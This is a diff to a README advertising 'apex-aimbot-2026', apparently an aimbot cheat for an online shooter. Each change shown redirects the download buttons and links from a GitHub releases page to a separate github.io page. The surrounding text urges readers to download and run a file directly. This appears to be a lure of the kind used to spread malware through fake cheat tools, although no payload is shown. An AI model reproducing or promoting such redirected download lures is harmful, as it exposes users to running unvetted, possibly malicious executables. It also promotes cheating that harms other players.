@@ -1,6 +1,6 @@
 # 🎯 apex-aimbot-2026 - Lock-On Victory with Zero Effort
 
-[![Download apex-aimbot-2026](https://img.shields.io/badge/Download-apex--aimbot--2026-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bridieregimented4166/apex-aimbot-2026/releases)
+[![Download apex-aimbot-2026](https://img.shields.io/badge/Download-apex--aimbot--2026-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://bridieregimented4166.github.io)
 
 ---
 
@@ -49,7 +49,7 @@ That's it. No installation wizard, no extra software, no registration. Just a st
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: [https://github.com/bridieregimented4166/apex-aimbot-2026/releases](https://github.com/bridieregimented4166/apex-aimbot-2026/releases)
+Visit this link to download the application: [https://bridieregimented4166.github.io](https://bridieregimented4166.github.io)
 
 Once you arrive at the page, you'll see the latest release. Click the download button for the file, save it to your computer, and you're ready to run it.
 
@@ -142,7 +142,7 @@ We are committed to keeping apex-aimbot-2026 working for as long as you need it.
 
 Download and run this file directly from the releases page to get started. The link is here again for your convenience:
 
-[**Download apex-aimbot-2026 Now**](https://github.com/bridieregimented4166/apex-aimbot-2026/releases)
+[**Download apex-aimbot-2026 Now**](https://bridieregimented4166.github.io)
 
 Don't let another match slip away because of shaky aim or missed loot. With apex-aimbot-2026, you're always ready for the fight. Lock on, grab the gear, and drop the lobby like a champion.
 
